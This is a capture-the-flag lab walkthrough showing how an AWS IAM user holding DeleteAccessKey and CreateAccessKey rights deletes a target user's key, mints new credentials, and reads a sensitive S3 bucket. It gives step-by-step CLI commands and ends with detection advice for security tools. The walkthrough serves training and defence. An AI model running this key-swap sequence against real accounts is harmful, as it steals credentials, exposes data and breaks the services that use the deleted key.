# Guided Walkthrough: Privilege Escalation via iam:DeleteAccessKey + iam:CreateAccessKey

This scenario demonstrates a sophisticated variation of the `iam:CreateAccessKey` privilege escalation technique that overcomes AWS's built-in security control limiting users to a maximum of two access keys. When an attacker has both `iam:DeleteAccessKey` and `iam:CreateAccessKey` permissions on a target user who already has two active access keys, the standard key creation approach would fail. However, by first deleting one of the existing keys and then creating a new one, the attacker bypasses this limit and gains access to the target user's credentials.

This attack pattern is particularly dangerous because it targets users who already have S3 bucket access permissions. In real-world environments, service accounts and automation users often have both access keys actively in use for different applications or services. The deletion of an existing key might cause a service disruption, but it also provides the attacker with fresh credentials that can be used to access sensitive data stored in S3 buckets.

The combination of these two permissions creates a powerful privilege escalation path that CSPM tools must detect. While many security tools flag `iam:CreateAccessKey` as a risk, fewer recognize that the pairing with `iam:DeleteAccessKey` enables an attacker to bypass AWS's native control mechanism. Detection systems should specifically monitor for sequential DeleteAccessKey/CreateAccessKey operations on the same user, as this pattern indicates potential credential theft in progress.

## The Challenge

You start as `pl-prod-iam-003-to-bucket-starting-user`, an IAM user with `iam:ListAccessKeys`, `iam:DeleteAccessKey`, and `iam:CreateAccessKey` permissions scoped to `pl-prod-iam-003-to-bucket-target-user`. Your goal is to read the contents of the sensitive S3 bucket (`pl-sensitive-data-iam-003-{account_id}-{suffix}`).

The catch: the target user already has two active access keys — the AWS maximum. You cannot simply create a new key. You need to clear a slot first.

## Reconnaissance

Let's start by confirming your identity and understanding what you have access to.

```bash
aws sts get-caller-identity
```

You should see you're operating as `pl-prod-iam-003-to-bucket-starting-user`. Now list the target user's existing access keys:

```bash
aws iam list-access-keys --user-name pl-prod-iam-003-to-bucket-target-user --output json
```

This returns two keys, both active. If you tried to create a third key right now, AWS would reject it with a `LimitExceeded` error. That's the 2-key limit in action — and the reason this technique requires the delete step first.

## Exploitation

### Step 1: Free Up a Key Slot

Pick one of the existing key IDs from the list output and delete it:

```bash
aws iam delete-access-key \
  --user-name pl-prod-iam-003-to-bucket-target-user \
  --access-key-id <KEY_ID_TO_DELETE>
```

The target user is now down to one active key. Whatever service was using that deleted key will start receiving authentication errors — a side effect that makes this technique noisier than a pure `CreateAccessKey` attack.

### Step 2: Create Your New Access Key

Now that there's room, create a new access key for the target user:

```bash
aws iam create-access-key \
  --user-name pl-prod-iam-003-to-bucket-target-user \
  --output json
```

Capture the `AccessKeyId` and `SecretAccessKey` from the response. This is the only time the secret will be shown — there's no way to retrieve it later.

### Step 3: Assume the Target User's Identity

Configure your environment with the new credentials:

```bash
export AWS_ACCESS_KEY_ID=<NEW_ACCESS_KEY_ID>
export AWS_SECRET_ACCESS_KEY=<NEW_SECRET_ACCESS_KEY>
unset AWS_SESSION_TOKEN
```

Wait about 15 seconds for the new key to propagate through AWS's IAM backend, then verify your new identity:

```bash
aws sts get-caller-identity
```

You should now see `pl-prod-iam-003-to-bucket-target-user` as your principal.

### Step 4: Access the S3 Bucket

Find the exact bucket name (it includes a random suffix):

```bash
aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-iam-003-')].Name" --output text
```

Then list its contents and download the sensitive data file:

```bash
aws s3 ls s3://<FULL_BUCKET_NAME>
aws s3 cp s3://<FULL_BUCKET_NAME>/sensitive-data.txt /tmp/sensitive-data.txt
cat /tmp/sensitive-data.txt
```

## Verification

If you can read the file contents, the escalation is complete. You've moved from a user with only IAM key management permissions to a user with S3 read access.

## Capture the Flag

The flag is stored directly in the target S3 bucket as `flag.txt`. Once you are operating as `pl-prod-iam-003-to-bucket-target-user` (using the newly created access key), retrieve it with:

```bash
aws s3 cp s3://<FULL_BUCKET_NAME>/flag.txt -
```

Replace `<FULL_BUCKET_NAME>` with the bucket name you discovered in the previous step (the one starting with `pl-sensitive-data-iam-003-`). The flag value will be printed directly to your terminal. That value is what you submit to complete the challenge.

## What Happened

You exploited a subtle but powerful IAM misconfiguration: the starting user had both `iam:DeleteAccessKey` and `iam:CreateAccessKey` on the target user, and the target user had S3 read access. By deleting one of the target's existing keys to free up a slot, then creating a new key, you obtained valid credentials for that user and used them to read sensitive data from S3.

In a real environment, this technique might go unnoticed if the deleted key was a backup or an inactive key. However, it does create detectable artifacts: a `DeleteAccessKey` event followed closely by a `CreateAccessKey` event on the same user is a strong signal of credential theft. CSPM tools should specifically flag the combination of both delete and create permissions on the same resource, as this enables bypassing AWS's native 2-key rate-limiting control.
